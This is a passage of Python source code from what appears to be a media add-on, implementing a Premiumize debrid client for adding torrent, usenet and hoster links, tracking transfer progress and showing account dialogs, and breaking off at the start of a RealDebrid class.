				title = source['name']
				if title == None or title == '':
					title = source['hash']

			boundry = 'X-X-X'
			headers = {'Content-Type' : 'multipart/form-data; boundary=%s' % boundry}

			data = bytearray('--%s\n' % boundry, 'utf8')
			data += bytearray('Content-Disposition: form-data; name="src"; filename="%s"\n' % title, 'utf8')
			data += bytearray('Content-Type: %s\n\n' % source['mime'], 'utf8')
			data += source['data']
			data += bytearray('\n--%s--\n' % boundry, 'utf8')

			if source['type'] == network.Container.TypeTorrent:
				type = self.TypeTorrent
			elif source['type'] == network.Container.TypeUsenet:
				type = self.TypeUsenet
			else:
				type = self.TypeHoster

			self._retrieve(category = self.CategoryTransfer, action = self.ActionCreate, type = type, httpData = data, httpHeaders = headers)
			if self.success():
				return self._addLink(hash = source['hash'], season = season, episode = episode)
			else:
				return self.ErrorPremiumize
		except:
			tools.Logger.error()
			return self.ErrorPremiumize

	def addHoster(self, link, season = None, episode = None):
		result = self._retrieve(action = self.ActionDownload, link = urllib.quote_plus(link))
		if self.success():
			return self._addLink(result = result, season = season, episode = episode)
		else:
			return self.ErrorPremiumize

	def addTorrent(self, link, title = None, season = None, episode = None):
		container = network.Container(link)
		source = container.information()
		if source['magnet']:
			self._retrieve(category = self.CategoryTransfer, action = self.ActionCreate, source = container.torrentMagnet(title = title, encode = True))
			if self.success():
				return self._addLink(hash = source['hash'], season = season, episode = episode)
			else:
				return self.ErrorPremiumize
		else:
			return self.addContainer(link = link, title = title, season = season, episode = episode)
			# NB: Torrent files can also added by link to Premiumize. Although this is a bit faster, there is no guarantee that Premiumize will be able to download the torrent file remotley.
			'''self._retrieve(category = self.CategoryTransfer, action = self.ActionCreate, source = link)
			if self.success():
				return self._addLink(hash = source['hash'], season = season, episode = episode)
			else:
				return self.ErrorPremiumize'''

	def addUsenet(self, link, title = None, season = None, episode = None):
		return self.addContainer(link = link, title = title, season = season, episode = episode)

	##############################################################################
	# ITEMS
	##############################################################################

	def _itemStatus(self, status, message = None):
		status = status.lower()
		if not message == None and 'download finished. copying the data' in message:
			return self.StatusFinalize
		elif any(state == status for state in ['error', 'fail', 'failure']):
			return self.StatusError
		elif any(state == status for state in ['timeout', 'time']):
			return self.StatusTimeout
		elif any(state == status for state in ['queued', 'queue']):
			return self.StatusQueued
		elif any(state == status for state in ['waiting', 'wait']):
			return self.StatusBusy
		elif any(state == status for state in ['finished', 'finish', 'seeding', 'seed', 'success']):
			return self.StatusFinished
		else:
			return self.StatusUnknown

	def _itemSeeding(self, status):
		status = status.lower()
		return any(state == status for state in ['seeding', 'seed'])

	def _itemType(self, type, name = None):
		type = type.lower()
		# Premiumize always says the type is torrent, even if it is a NZB.
		# Try to detect usenet by searching the name
		if type == self.TypeTorrent:
			if name and any(search in name for search in [self.TypeUsenet, Debrid.ModeUsenet]):
				return self.TypeUsenet
			else:
				return self.TypeTorrent
		elif type == self.TypeUsenet or type == Debrid.ModeUsenet: # NZBs are shown as torrents. But just in case.
			return self.TypeUsenet
		else:
			return self.TypeHoster # Seems like hoster links are never added to transfer list. But just in case.

	def _itemName(self, name):
		if name.startswith(self.Prefix):
			name = name[len(self.Prefix):]
		return name

	def _itemSize(self, size = None, message = None):
		if (size == None or size <= 0) and not message == None:
			start = message.find('% of ')
			if start < 0:
				size = 0
			else:
				end = message.find('finished.', start)
				if end < 0:
					size = 0
				else:
					size = message[start : end].upper() # Must be made upper, because otherwise it is seen as bits instead of bytes.
					size = convert.ConverterSize(size).value()
		return int(size)

	def _itemSpeed(self, message):
		speed = 0
		if not message == None:
			start = message.find('downloading at ')
			if start >= 0:
				end = message.find('. ', start)
				if end < 0:
					end = message.find('s.', start)
					if end >= 0: end += 1
				if end >= 0:
					speed = convert.ConverterSpeed(message[start : end]).value()
		return int(speed)

	def _itemTime(self, time = None, message = None):
		if (time == None or time <= 0) and not message == None:
			start = message.find('eta is ')
			if start < 0:
				time = 0
			else:
				time = convert.ConverterDuration(message[start + 7:]).value(convert.ConverterDuration.UnitSecond)
		if time == None: time = 0
		return int(time)

	def _itemsTransfer(self):
		items = []
		results = self._retrieve(category = self.CategoryTransfer, action = self.ActionList)
		if self.success() and 'transfers' in results:
			results = results['transfers']
			for result in results:
				item = {}
				message = result['message'] if 'message' in result else None
				if not message == None:
					message = message.lower()

				# Hash
				if 'hash' in result and not result['hash'] == None:
					hash = result['hash'].lower()
				else:
					hash = None
				item['hash'] = hash

				# Premiumize adds the same torrent multiple times to the transfer list if the torrent was added multiple times.
				# Only use the first occurance.
				found = False
				for i in items:
					if hash == i['hash']:
						found = True
						break
				if found: continue

				# ID
				if 'id' in result and not result['id'] == None:
					id = result['id'].lower()
				elif 'hash' in item:
					id = item['hash'].lower()
				else:
					id = None
				item['id'] = id

				# If you add a download multiple times, they will show multiple times in the list. Only add one instance.
				found = False
				for i in items:
					if i['id'] == id:
						found = True
						break
				if found: continue

				# Name
				if 'name' in result and not result['name'] == None:
					name = self._itemName(result['name'])
				else:
					name = None
				item['name'] = name

				# Type
				if 'type' in result and not result['type'] == None:
					type = self._itemType(result['type'], name)
				else:
					type = None
				item['type'] = type

				# Size
				size = 0
				if ('size' in result and not result['size'] == None) or (not message == None):
					size = self._itemSize(size = result['size'], message = message)
				size = convert.ConverterSize(size)
				item['size'] = {'bytes' : size.value(), 'description' : size.stringOptimal()}

				# Status
				if 'status' in result and not result['status'] == None:
					status = self._itemStatus(result['status'], message)
				else:
					status = None
				item['status'] = status

				# Error
				if status == self.StatusError:
					error = None
					if message:
						if 'retention' in message:
							error = 'Out of server retention'
						elif 'missing' in message:
							error = 'The transfer job went missing'
						elif 'password' in message:
							error = 'The file is password protected'
						elif 'repair' in message:
							error = 'The file is unrepairable'

					item['error'] = error

				# Transfer
				transfer = {}

				# Transfer - Speed
				speed = {}
				speedDownload = self._itemSpeed(message)
				speedConverter = convert.ConverterSpeed(speedDownload)
				speed['bytes'] = speedConverter.value(convert.ConverterSpeed.Byte)
				speed['bits'] = speedConverter.value(convert.ConverterSpeed.Bit)
				speed['description'] = speedConverter.stringOptimal()
				transfer['speed'] = speed

				# Transfer - Torrent
				if type == self.TypeTorrent:
					torrent = {}
					if 'status' in result and not result['status'] == None:
						seeding = self._itemSeeding(result['status'])
					else:
						seeding = False
					torrent['seeding'] = seeding
					torrent['seeders'] = result['seeder'] if 'seeder' in result else 0
					torrent['leechers'] = result['leecher'] if 'leecher' in result else 0
					torrent['ratio'] = result['ratio'] if 'ratio' in result else 0
					transfer['torrent'] = torrent

				# Transfer - Progress
				if ('progress' in result and not result['progress'] == None) or ('eta' in result and not result['eta'] == None):
					progress = {}

					progressValueCompleted = 0
					progressValueRemaining = 0
					if 'progress' in result and not result['progress'] == None:
						progressValueCompleted = float(result['progress'])
					if progressValueCompleted == 0 and 'status' in item and item['status'] == self.StatusFinished:
						progressValueCompleted = 1
					progressValueRemaining = 1 - progressValueCompleted

					progressPercentageCompleted = round(progressValueCompleted * 100, 1)
					progressPercentageRemaining = round(progressValueRemaining * 100, 1)

					progressSizeCompleted = 0
					progressSizeRemaining = 0
					if 'size' in item:
						progressSizeCompleted = int(progressValueCompleted * item['size']['bytes'])
						progressSizeRemaining = int(item['size']['bytes'] - progressSizeCompleted)

					progressTimeCompleted = 0
					progressTimeRemaining = 0
					time = result['eta'] if 'eta' in result else None
					progressTimeRemaining = self._itemTime(time, message)

					completed = {}
					size = convert.ConverterSize(progressSizeCompleted)
					time = convert.ConverterDuration(progressTimeCompleted, convert.ConverterDuration.UnitSecond)
					completed['value'] = progressValueCompleted
					completed['percentage'] = progressPercentageCompleted
					completed['size'] = {'bytes' : size.value(), 'description' : size.stringOptimal()}
					completed['time'] = {'seconds' : time.value(convert.ConverterDuration.UnitSecond), 'description' : time.string(convert.ConverterDuration.FormatDefault)}

					remaining = {}
					size = convert.ConverterSize(progressSizeRemaining)
					time = convert.ConverterDuration(progressTimeRemaining, convert.ConverterDuration.UnitSecond)
					remaining['value'] = progressValueRemaining
					remaining['percentage'] = progressPercentageRemaining
					remaining['size'] = {'bytes' : size.value(), 'description' : size.stringOptimal()}
					remaining['time'] = {'seconds' : time.value(convert.ConverterDuration.UnitSecond), 'description' : time.string(convert.ConverterDuration.FormatDefault)}

					progress['completed'] = completed
					progress['remaining'] = remaining
					transfer['progress'] = progress

				# Transfer
				item['transfer'] = transfer

				# Append
				items.append(item)
		return items

	def _item(self, hash, season = None, episode = None):
		item = {}
		hash = hash.lower()
		result = self._retrieve(category = self.CategoryTorrent, action = self.ActionBrowse, hash = hash)

		if self.success() and 'content' in result:
			# ID and Hash
			item = {'id' : hash, 'hash' : hash}

			# Items
			allDirectories = []
			allFiles = []

			def isVideo(name, extension, width = None, height = None, duration = None):
				if (not width == None and width > 0) or (not height == None and height > 0) or (not duration == None and duration > 0):
					return True
				else:
					if not extension == None:
						extension = extension.lower()
						if any(e == extension for e in tools.Video.extensions()):
							return True
					if not name == None:
						name = name.lower()
						if any(name.endswith('.' + e) for e in tools.Video.extensions()):
							return True
				return False

			def randomId():
				return str(uuid.uuid4().hex)

			def addDirectory(dictionary, parent = None):
				id = randomId()
				directory = {}

				directory['id'] = id
				directory['parent'] = parent
				if parent == None:
					directory['name'] = 'root'
				else:
					directory['name'] = dictionary['name'] if 'name' in dictionary else None

				size = 0
				if 'size' in dictionary and not dictionary['size'] == None:
					size = dictionary['size']
				size = convert.ConverterSize(size)
				directory['size'] = {'bytes' : size.value(), 'description' : size.stringOptimal()}

				items = {}
				subDirectories = []
				subFiles = []
				subLargest = None

				count = dictionary['items'] if 'items' in dictionary else 0
				itemsContent = None
				if 'content' in dictionary:
					itemsContent = dictionary['content']
				elif 'children' in dictionary:
					itemsContent = dictionary['children']
				if isinstance(itemsContent, dict):
					for key, value in itemsContent.iteritems():
						if 'type' in value:
							if value['type'] == 'dir':
								sub, largest = addDirectory(value, id)
								subDirectories.append(sub['id'])
								if subLargest == None or (not largest == None and largest['size']['bytes'] > subLargest['size']['bytes'] and not largest['link'] == None):
									subLargest = largest
							elif value['type'] == 'file':
								sub = addFile(value, id)
								subFiles.append(sub['id'])
								if subLargest == None or (sub['size']['bytes'] > subLargest['size']['bytes'] and not sub['link'] == None):
									subLargest = sub

				items['all'] = subDirectories + subFiles
				items['directories'] = subDirectories
				items['files'] = subFiles
				items['count'] = dictionary['items'] if 'items' in dictionary else 0
				directory['items'] = items

				directory['video'] = subLargest['id'] if not subLargest == None and 'id' in subLargest else None

				directory['link'] = dictionary['zip'] if 'zip' in dictionary else None

				allDirectories.append(directory)
				return directory, subLargest

			def addFile(dictionary, parent):
				id = randomId()
				file = {}

				file['id'] = id
				file['parent'] = parent

				file['name'] = dictionary['name'] if 'name' in dictionary else None
				file['extension'] = dictionary['ext'] if 'ext' in dictionary else None
				file['link'] = dictionary['url'] if 'url' in dictionary else None

				size = 0
				if 'size' in dictionary and not dictionary['size'] == None:
					size = dictionary['size']
				size = convert.ConverterSize(size)
				file['size'] = {'bytes' : size.value(), 'description' : size.stringOptimal()}

				# Do not use transcoded, its links never work.

				meta = {}
				if 'mime' in dictionary:
					meta['mime'] = dictionary['mimetype']

				width = dictionary['width'] if 'width' in dictionary else None
				height = dictionary['height'] if 'height' in dictionary else None
				duration = dictionary['duration'] if 'duration' in dictionary else None
				video = isVideo(name = file['name'], extension = file['extension'], width = width, height = height, duration = duration)

				if not width == None:
					meta['width'] = width
				elif video:
					meta['width'] = 0
				if not height == None:
					meta['height'] = height
				elif video:
					meta['height'] = 0
				if not duration == None:
					time = convert.ConverterDuration(duration, convert.ConverterDuration.UnitSecond)
					meta['duration'] = {'seconds' : time.value(convert.ConverterDuration.UnitSecond), 'description' : time.string(convert.ConverterDuration.FormatDefault)}
				elif video:
					meta['duration'] = 0

				meta['video'] = video

				if meta:
					file['metadata'] = meta

				allFiles.append(file)
				return file

			if 'content' in result:
				directory, largest = addDirectory(result)
				item['size'] = directory['size']
				item['link'] = directory['link']

				items = {}
				items['directories'] = allDirectories
				items['files'] = allFiles
				items['count'] = len(allDirectories) + len(allFiles)
				item['items'] = items

				if not season == None and not episode == None:
					largest = None # Invalidate the link if the episode is not found in the season pack.
					meta = metadata.Metadata()
					for file in allFiles:
						if meta.episodeContains(title = file['name'], season = season, episode = episode):
							if largest == None or file['size']['bytes'] > largest['size']['bytes']:
								largest = file

				item['video'] = largest

		return item

	# Determines if two Premiumize links point to the same file.
	# Cached Premiumize items always return a different link containing a random string, which actually points to the same file.
	# Must be updated in downloader.py as well.
	@classmethod
	def itemEqual(self, link1, link2):
		domain = 'energycdn.com'
		index1 = link1.find(domain)
		index2 = link2.find(domain)
		if index1 >= 0 and index2 >= 0:
			items1 = link1[index1:].split('/')
			items2 = link2[index2:].split('/')
			if len(items1) >= 8 and len(items2) >= 8:
				return items1[-1] == items2[-1] and items1[-2] == items2[-2] and items1[-3] == items2[-3]
		return False

	# Retrieve the info of a single file.
	# transfer: retrieves the download info (Downloader)
	# content: retrieves the finished file into (My Files)
	# season/episode: filters for specific episode in season pack.
	def item(self, id, transfer = True, content = True, season = None, episode = None):
		id = id.lower()

		self.tResultTransfers = None
		def threadTransfers():
			self.tResultTransfers = self._itemsTransfer()

		self.tResultItem = None
		def threadItem(id, season, episode):
			self.tResultItem = self._item(hash = id, season = season, episode = episode)

		threads = []
		if transfer:
			threads.append(threading.Thread(target = threadTransfers))
		if content:
			threads.append(threading.Thread(target = threadItem, args = (id, season, episode)))

		[thread.start() for thread in threads]
		[thread.join() for thread in threads]

		result = None
		if not self.tResultTransfers == None and not self.tResultItem == None:
			for transfer in self.tResultTransfers:
				if transfer['id'] == id or transfer['hash'] == id:
					result = dict(transfer.items() + self.tResultItem.items()) # Only updates values if non-exisitng. Updates from back to front.
					break
		elif not self.tResultTransfers == None:
			for transfer in self.tResultTransfers:
				if transfer['id'] == id:
					result = transfer
					break

		if result == None:
			result = self.tResultItem

		self.tResultTransfers = None
		self.tResultItem = None

		return result

	##############################################################################
	# DOWNLOADS
	##############################################################################

	def downloadInformation(self):
		items = self._itemsTransfer()
		if isinstance(items, list):
			count = len(items)
			countBusy = 0
			countFinished = 0
			countFailed = 0
			size = 0
			for item in items:
				size += item['size']['bytes']
				status = item['status']
				if status in [self.StatusUnknown, self.StatusError, self.StatusTimeout]:
					countFailed += 1
				elif status in [self.StatusFinished]:
					countFinished += 1
				else:
					countBusy += 1
			size = convert.ConverterSize(value = size, unit = convert.ConverterSize.Byte)

			return {
				'count' : {
					'total' : count,
					'busy' : countBusy,
					'finished' : countFinished,
					'failed' : countFailed,
				},
				'size' : {
					'bytes' : size.value(),
					'description' : size.stringOptimal()
				},
				'usage' : self.account()['usage']
			}
		else:
			return self.ErrorPremiumize

	##############################################################################
	# CACHED
	##############################################################################

	# id: single hash or list of hashes.
	def cachedIs(self, id, timeout = None):
		result = self.cached(id = id, timeout = timeout)
		if isinstance(result, dict):
			return result['cached']
		elif isinstance(result, list):
			return [i['cached'] for i in result]
		else:
			return False

	# id: single hash or list of hashes.
	# NB: a URL has a maximum length. Hence, a list of hashes cannot be too long, otherwise the request will fail.
	def cached(self, id, timeout = None):
		single = isinstance(id, basestring)
		if single: id = [id] # Must be passed in as a list.

		# If the encryption setting is disabled, request must happen over GET, since Premiumize ignores POST parameters over HTTP.
		# A URL has a maximum length, so the hashes have to be split into parts and processes sequentially, in order not to exceed the URL limit.
		if self.Encryption:
			chunks = [id[i:i + self.LimitHashesPost] for i in xrange(0, len(id), self.LimitHashesPost)]
		else:
			chunks = [id[i:i + self.LimitHashesGet] for i in xrange(0, len(id), self.LimitHashesGet)]

		chunkTimeout = int(timeout / float(len(chunks)))
		result = {}

		try:
			for chunk in chunks:
				chunkResult = self._retrieve(category = self.CategoryTorrent, action = self.ActionCheck, hash = chunk, httpTimeout = chunkTimeout)
				if self.success():
					result.update(chunkResult['hashes'])
		except:
			pass

		caches = []
		for key, value in result.iteritems():
			key = key.lower()
			caches.append({'id' : key, 'hash' : key, 'cached' : value['status'] == 'finished'})
		if single and not result == None and len(result) > 0:
			return caches[0]
		else:
			return caches

class PremiumizeInterface(object):

	Name = 'Premiumize'
	Stop = False # Stop all threads

	##############################################################################
	# CONSTRUCTOR
	##############################################################################

	def __init__(self):
		self.mPremiumize = Premiumize()

	##############################################################################
	# STOP
	##############################################################################

	# Not sure if this actually works from sources __init__.py
	@classmethod
	def stop(self):
		time.sleep(0.1) # Make sure that the Loader is visible if called just before this function. Otherwise Loader.visible() always returns false.
		visible = interface.Loader.visible()
		if not visible:
			interface.Loader.show()
		self.Stop = True
		time.sleep(0.7) # Must be just above the threads' timestep.
		self.Stop = False
		if not visible:
			interface.Loader.hide()

	##############################################################################
	# ACCOUNT
	##############################################################################

	def account(self):
		interface.Loader.show()
		valid = False
		title = self.Name + ' ' + interface.Translation.string(33339)
		if self.mPremiumize.accountEnabled():
			account = self.mPremiumize.account(cache = False)
			if account:
				valid = interface.Translation.string(33341) if self.mPremiumize.accountValid() else interface.Translation.string(33342)
				user = account['user']
				type = account['type'].capitalize()

				date = account['expiration']['date']
				days = str(account['expiration']['remaining'])

				percentage = str(account['usage']['consumed']['percentage']) + '%'

				pointsUsed = account['usage']['consumed']['points']
				pointsTotal = account['usage']['consumed']['points'] + account['usage']['remaining']['points']
				points = str(pointsUsed) + ' ' + interface.Translation.string(33073) + ' ' + str(pointsTotal)

				storageUsed = account['usage']['consumed']['size']['description']
				storageTotal = convert.ConverterSize(account['usage']['consumed']['size']['bytes'] + account['usage']['remaining']['size']['bytes']).stringOptimal()
				storage = storageUsed + ' ' + interface.Translation.string(33073) + ' ' + storageTotal

				items = []

				# Information
				items.append(interface.Format.font(interface.Translation.string(33344), bold = True, uppercase = True))
				items.append(interface.Format.font(interface.Translation.string(33340) + ': ', bold = True) + valid)
				items.append(interface.Format.font(interface.Translation.string(32303) + ': ', bold = True) + user)
				items.append(interface.Format.font(interface.Translation.string(33343) + ': ', bold = True) + type)

				# Expiration
				items.append('')
				items.append(interface.Format.font(interface.Translation.string(33345), bold = True, uppercase = True))
				items.append(interface.Format.font(interface.Translation.string(33346) + ': ', bold = True) + date)
				items.append(interface.Format.font(interface.Translation.string(33347) + ': ', bold = True) + days)

				# Usage
				items.append('')
				items.append(interface.Format.font(interface.Translation.string(33228), bold = True, uppercase = True))
				items.append(interface.Format.font(interface.Translation.string(33348) + ': ', bold = True) + percentage)
				items.append(interface.Format.font(interface.Translation.string(33349) + ': ', bold = True) + points)
				items.append(interface.Format.font(interface.Translation.string(33350) + ': ', bold = True) + storage)

				# Dialog
				interface.Loader.hide()
				interface.Dialog.options(title = title, items = items)
			else:
				interface.Loader.hide()
				interface.Dialog.confirm(title = title, message = interface.Translation.string(33352) % self.Name)
		else:
			interface.Loader.hide()
			interface.Dialog.confirm(title = title, message = interface.Translation.string(33351) % self.Name)

		return valid

	##############################################################################
	# CLEAR
	##############################################################################

	def clear(self):
		title = self.Name + ' ' + interface.Translation.string(33013)
		message = 'Do you want to clear your Premiumize downloads and delete all your files from the server?'
		if interface.Dialog.option(title = title, message = message):
			interface.Loader.show()
			self.mPremiumize.deleteAll()
			interface.Loader.hide()
			message = 'Premiumize Downloads Cleared'
			interface.Dialog.notification(title = title, message = message, icon = interface.Dialog.IconSuccess)

	##############################################################################
	# ADD
	##############################################################################

	# season/episode: Filter out the correct file from a season pack.
	def add(self, link, title = None, season = None, episode = None, close = True, source = None):
		link = self.mPremiumize.add(link = link, title = title, season = season, episode = episode, source = source)
		if link == Premiumize.ErrorInaccessible:
			title = 'Stream Error'
			message = 'The stream is inaccessible'
			self._addError(title = title, message = message)
			return None
		elif link == Premiumize.ErrorPremiumize:
			title = 'Stream Error'
			message = 'The stream could not be added to Premiumize'
			self._addError(title = title, message = message)
			return None
		elif link == Premiumize.ErrorUnknown or link == None or link == '':
			title = 'Stream Error'
			message = 'The stream is unavailable'
			self._addError(title = title, message = message)
			return None
		elif network.Networker.linkIs(link):
			return link
		else:
			return self._addLink(link, season = season, episode = episode, close = close)

	def _addAction(self, id, type, season = None, episode = None, close = True):
		def show(id, season, episode, close):
			items = []
			items.append(interface.Format.font(interface.Translation.string(33077) + ': ', bold = True) + interface.Translation.string(33078))
			items.append(interface.Format.font(interface.Translation.string(33079) + ': ', bold = True) + interface.Translation.string(33080))
			items.append(interface.Format.font(interface.Translation.string(33083) + ': ', bold = True) + interface.Translation.string(33084))
			choice = interface.Dialog.options(title = 33076, items = items)

			if choice == 0:
				self._addLink(id, season = season, episode = episode, close = close)
			if choice == 2:
				self.mPremiumize.deleteTransfer(id = id, type = type)
			else: # if choice is 1 or -1. -1: If the user hits the cancel button.
				return

		# Must be started in a thread, because _addLink calls this function, and this function calls _addLink again (if choice 0).
		# Hence there is a circular call, and the first _addLink never finishes while the inner _addLink still runs. Can create and infinite function call if the user constantly selects choice 0.
		thread = threading.Thread(target = show, args = (id, season, episode, close))
		thread.start()

	def _addError(self, title, message, delay = True):
		interface.Loader.hide() # Make sure hided from sources __init__.py
		interface.Dialog.notification(title = title, message = message, icon = interface.Dialog.IconError)
		if delay: time.sleep(2) # Otherwise the message disappears to quickley when another notification is shown afterwards.

	def _addErrorDetermine(self, item):
		status = item['status']
		if status == Premiumize.StatusError:
			title = 'Download Error'
			message = None
			if item['error']:
				message = item['error']
			if message == None:
				message = 'The download failed with an unknown error'
			self._addError(title = title, message = message)
			return True
		elif status == Premiumize.StatusTimeout:
			title = 'Download Timeout'
			message = 'The download failed due to a timeout'
			self._addError(title = title, message = message)
			return True
		return False

	def _addLink(self, id, season = None, episode = None, close = True):
		unknown = 'Unknown'
		self.tLink =  '' # IMPORTANT: If None is returned, Bubbles will automatically try to download the next item in the list, instead of waiting for the current item to finish downloading.
		item = self.mPremiumize.item(id = id, transfer = True, content = True, season = season, episode = episode)
		type = item['type']
		if item:
			try:
				self.tLink = item['video']['link']
				if self.tLink: return self.tLink
			except: pass
			try: percentage = item['transfer']['progress']['completed']['percentage']
			except: percentage = 0
			status = item['status']
			if self._addErrorDetermine(item):
				pass
			elif status == Premiumize.StatusQueued or Premiumize.StatusBusy or status == Premiumize.StatusFinalize:
				title = 'Premiumize Download'
				message = 'The download is in progress'
				descriptionWaiting = 'Waiting for the download to start '
				descriptionFinalize = 'Finalizing the download'

				interface.Loader.hide() # Make sure hided from sources __init__.py
				background = tools.Settings.getInteger('interface.stream.progress') == 1

				self.tProgressDialog = interface.Dialog.progress(title = title, message = message, background = background)

				# Keep the dialog in a global variable to ensure the dialog does not close if this object is deleted.
				if not close:
					global DebridProgressDialog
					DebridProgressDialog = self.tProgressDialog

				if background: self.tProgressDialog.update(int(percentage), interface.Dialog.title(title), descriptionWaiting)
				else: self.tProgressDialog.update(int(percentage), interface.Format.fontBold(descriptionWaiting))

				def updateProgress(id, percentage):
					try:
						status = Premiumize.StatusQueued
						seconds = None
						self.tProgressDots = ''

						timer = tools.Time(start = True)
						timerShort = False
						timerLong = False
						counter = 0

						item = self.mPremiumize.item(id = id, transfer = True, content = True, season = season, episode = episode)
						while True:
							if counter == 10: # Only make an API request every 5 seconds.
								item = self.mPremiumize.item(id = id, transfer = True, content = True, season = season, episode = episode)
								counter = 0
							counter += 1

							status = item['status'] if 'status' in item else None
							try:
								self.tLink = item['video']['link']
								if self.tLink:
									return
							except: pass
							if not status == Premiumize.StatusQueued and not status == Premiumize.StatusBusy and not status == Premiumize.StatusFinalize:
								self._addErrorDetermine(item)
								break

							waiting = item['transfer']['speed']['bytes'] == 0 and item['size']['bytes'] == 0 and item['transfer']['progress']['completed']['value'] == 0 and item['transfer']['progress']['completed']['time']['seconds'] == 0

							if status == Premiumize.StatusFinalize:
								if background: self.tProgressDialog.update(0, interface.Dialog.title(title), descriptionFinalize + self.tProgressDots)
								else: self.tProgressDialog.update(0, interface.Format.fontBold(descriptionFinalize + self.tProgressDots))
								self.tProgressDots += '.'
								if len(self.tProgressDots) > 3: self.tProgressDots = ''
							elif waiting:
								if background: self.tProgressDialog.update(0, interface.Dialog.title(title), descriptionWaiting + self.tProgressDots)
								else: self.tProgressDialog.update(0, interface.Format.fontBold(descriptionWaiting + self.tProgressDots))
								self.tProgressDots += '.'
								if len(self.tProgressDots) > 3: self.tProgressDots = ''
							else:
								percentageNew = item['transfer']['progress']['completed']['percentage']
								# If Premiumize looses the connection in the middle of the download, the progress goes back to 0, causing the dialog to close. Avoid this by keeping track of the last progress.
								if percentageNew >= percentage:
									percentage = percentageNew
									description = ''
									speed = item['transfer']['speed']['description']
									speedBytes = item['transfer']['speed']['bytes']
									size = item['size']['description']
									sizeBytes = item['size']['bytes']
									sizeCompleted = item['transfer']['progress']['completed']['size']['description']
									seconds = item['transfer']['progress']['remaining']['time']['seconds']
									if seconds == 0:
										eta = unknown
										if background: eta += ' ETA'
									else:
										eta = item['transfer']['progress']['remaining']['time']['description']

									description = []
									if background:
										if speed: description.append(speed)
										if size and sizeBytes > 0: description.append(size)
										if eta: description.append(eta)
										if len(description) > 0:
											description = interface.Format.fontSeparator().join(description)
										else:
											description = 'Unknown Progress'
									else:
										if speed:
											if speedBytes <= 0:
												speed = unknown
											description.append(interface.Format.font('Download Speed: ', bold = True) + speed)
										if size:
											if sizeBytes > 0:
												size = sizeCompleted + ' of ' + size
											else:
												size = unknown
											description.append(interface.Format.font('Download Size: ', bold = True) + size)
										if eta: description.append(interface.Format.font('Remaining Time: ', bold = True) + eta)
										description = interface.Format.fontNewline().join(description)

									if background: self.tProgressDialog.update(int(percentage), interface.Dialog.title(title), description)
									else: self.tProgressDialog.update(int(percentage), description)

							try: canceled = self.tProgressDialog.iscanceled()
							except: canceled = False
							if canceled or self.Stop:
								break

							# Ask to close a background dialog, because there is no cancel button as with the foreground dialog.
							elapsed = timer.elapsed()
							conditionShort = timerShort == False and elapsed > 30
							conditionLong = timerLong == False and elapsed > 120
							if (conditionShort or conditionLong) and background:
								if conditionShort: question = 'The download is taking a bit longer.'
								else: question = 'The download is taking a lot longer.'

								if seconds: question += ' The estimated remaining time is ' + convert.ConverterDuration(seconds, convert.ConverterDuration.UnitSecond).string(format = convert.ConverterDuration.FormatWordMedium) + '.'
								else: question += ' The estimated remaining time is currently unknown.'

								if conditionShort: question += ' Do you want to take action or let the download continue in the background?'
								else: question += ' Are you sure you do not want to take action and let the download continue in the background?'

								if conditionShort: timerShort = True
								if conditionLong: timerLong = True

								answer = interface.Dialog.option(title = title, message = question, labelConfirm = 'Take Action', labelDeny = 'Continue Download')
								if answer:
									self.tProgressDialog.close()
									self._addAction(id = id, type = type, season = season, episode = episode, close = close)
									return

							# Sleep
							time.sleep(0.5)

						if close: self.tProgressDialog.close()
					except:
						pass

					# Action Dialog
					try: canceled = self.tProgressDialog.iscanceled()
					except: canceled = False
					if canceled:
						if close: self.tProgressDialog.close()
						self._addAction(id = id, type = type, season = season, episode = episode, close = close)
						return

				# END of updateProgress

				try:
					thread = threading.Thread(target = updateProgress, args = (id, percentage))
					thread.start()
					thread.join()
				except:
					pass
		else:
			title = 'Download Error'
			message = 'The download failed'
			self._addError(title = title, message = message)
		return self.tLink

	##############################################################################
	# DOWNLOAD
	##############################################################################

	def downloadInformation(self):
		interface.Loader.show()
		title = self.Name + ' ' + interface.Translation.string(32009)
		if self.mPremiumize.accountEnabled():
			account = self.mPremiumize.account()
			if account:
				information = self.mPremiumize.downloadInformation()
				items = []

				# Count
				count = information['count']
				items.append({
					'title' : 33496,
					'items' : [
						{ 'title' : 33497, 'value' : str(count['total']) },
						{ 'title' : 33291, 'value' : str(count['busy']) },
						{ 'title' : 33294, 'value' : str(count['finished']) },
						{ 'title' : 33295, 'value' : str(count['failed']) },
					]
				})

				# Size
				size = information['size']
				items.append({
					'title' : 33498,
					'items' : [
						{ 'title' : 33497, 'value' : size['description'] },
					]
				})

				# Usage
				percentage = str(information['usage']['consumed']['percentage']) + '%'

				pointsUsed = information['usage']['consumed']['points']
				pointsTotal = information['usage']['consumed']['points'] + information['usage']['remaining']['points']
				points = str(pointsUsed) + ' ' + interface.Translation.string(33073) + ' ' + str(pointsTotal)

				storageUsed = information['usage']['consumed']['size']['description']
				storageTotal = convert.ConverterSize(information['usage']['consumed']['size']['bytes'] + information['usage']['remaining']['size']['bytes']).stringOptimal()
				storage = storageUsed + ' ' + interface.Translation.string(33073) + ' ' + storageTotal

				items.append({
					'title' : 33228,
					'items' : [
						{ 'title' : 33348, 'value' : percentage },
						{ 'title' : 33349, 'value' : points },
						{ 'title' : 33350, 'value' : storage },
					]
				})

				# Dialog
				interface.Loader.hide()
				interface.Dialog.information(title = title, items = items)
			else:
				interface.Loader.hide()
				interface.Dialog.confirm(title = title, message = interface.Translation.string(33352) % self.Name)
		else:
			interface.Loader.hide()
			interface.Dialog.confirm(title = title, message = interface.Translation.string(33351) % self.Name)

############################################################################################################################################################
# REALDEBRID
############################################################################################################################################################

class RealDebrid(Debrid):

	# Service Statuses
	ServiceStatusUp = 'up'
	ServiceStatusDown = 'down'
	ServiceStatusUnsupported = 'unsupported'

	ServicesUpdate = None
	ServicesTorrent = [
		{	'name' : 'Torrent',		'id' : 'torrent',	'domain' : '',	'status' : ServiceStatusUp,	'supported' : True	},
	]

	#Links
	LinkMain = 'https://real-debrid.com'
	LinkApi = 'https://api.real-debrid.com/rest/1.0'
	LinkAuthentication = 'https://api.real-debrid.com/oauth/v2'

	# Modes
	ModeGet = 'get'
	ModePost = 'post'
	ModePut = 'put'
	ModeDelete = 'delete'

	# Types
	TypeTorrent = 'torrent'

	# Statuses
	StatusUnknown = 'unknown'
	StatusError = 'error'
	StatusMagnetError = 'magnet_error'
	StatusMagnetConversion = 'magnet_conversion'
	StatusFileSelection = 'waiting_files_selection'
	StatusQueued = 'queued'
	StatusBusy = 'downloading'
	StatusFinished = 'downloaded'
	StatusVirus = 'virus'
